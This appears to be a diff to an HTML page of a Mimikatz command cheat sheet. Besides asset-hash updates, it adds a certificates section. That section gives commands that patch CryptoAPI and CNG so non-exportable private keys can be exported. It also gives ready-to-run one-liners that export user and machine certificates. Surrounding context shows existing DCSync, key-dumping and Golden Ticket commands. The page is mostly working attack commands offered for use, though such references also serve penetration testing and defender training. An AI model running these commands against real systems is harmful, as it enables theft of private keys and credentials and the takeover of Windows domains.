@@ -38,10 +38,10 @@
             const path_to_root = "../";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "../searchindex-45f66119.js";
+            window.path_to_searchindex_js = "../searchindex-4f962408.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="../toc-9a594cb9.js"></script>
+        <script src="../toc-22248eaf.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -256,6 +256,31 @@
 <pre><code>sekurlsa::ekeys
 </code></pre>
 <hr>
+<h2 id="crypto-module-certificates"><a class="header" href="#crypto-module-certificates">crypto Module (Certificates)</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>crypto::capi</code></td><td>Patch CryptoAPI to make non-exportable keys exportable</td></tr>
+<tr><td><code>crypto::cng</code></td><td>Patch CNG to make non-exportable keys exportable</td></tr>
+<tr><td><code>crypto::certificates /export</code></td><td>Export all user certificates</td></tr>
+<tr><td><code>crypto::certificates /systemstore:local_machine /export</code></td><td>Export machine certificates</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="export-user-certificates"><a class="header" href="#export-user-certificates">Export User Certificates</a></h3>
+<pre><code>crypto::certificates /export
+</code></pre>
+<h3 id="export-machine-certificates"><a class="header" href="#export-machine-certificates">Export Machine Certificates</a></h3>
+<pre><code>crypto::certificates /systemstore:local_machine /export
+</code></pre>
+<h3 id="make-keys-exportable-patch-cryptoapi"><a class="header" href="#make-keys-exportable-patch-cryptoapi">Make Keys Exportable (Patch CryptoAPI)</a></h3>
+<pre><code>crypto::capi
+crypto::cng
+</code></pre>
+<hr>
 <h2 id="lsadump-module"><a class="header" href="#lsadump-module">lsadump Module</a></h2>
 <div class="table-wrapper">
 <table>
@@ -338,6 +363,12 @@ lsadump::dcsync /domain:domain.local /all /csv
 </code></pre>
 <h3 id="golden-ticket-attack"><a class="header" href="#golden-ticket-attack">Golden Ticket Attack</a></h3>
 <pre><code class="language-cmd">mimikatz.exe "privilege::debug" "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:&lt;hash&gt; /ptt" "exit"
+</code></pre>
+<h3 id="export-all-certificates"><a class="header" href="#export-all-certificates">Export All Certificates</a></h3>
+<pre><code class="language-cmd">mimikatz.exe "privilege::debug" "crypto::capi" "crypto::certificates /export" "exit"
+</code></pre>
+<h3 id="export-machine-certificates-1"><a class="header" href="#export-machine-certificates-1">Export Machine Certificates</a></h3>
+<pre><code class="language-cmd">mimikatz.exe "privilege::debug" "crypto::capi" "crypto::certificates /systemstore:local_machine /export" "exit"
 </code></pre>
 <hr>
 <h2 id="common-errors"><a class="header" href="#common-errors">Common Errors</a></h2>
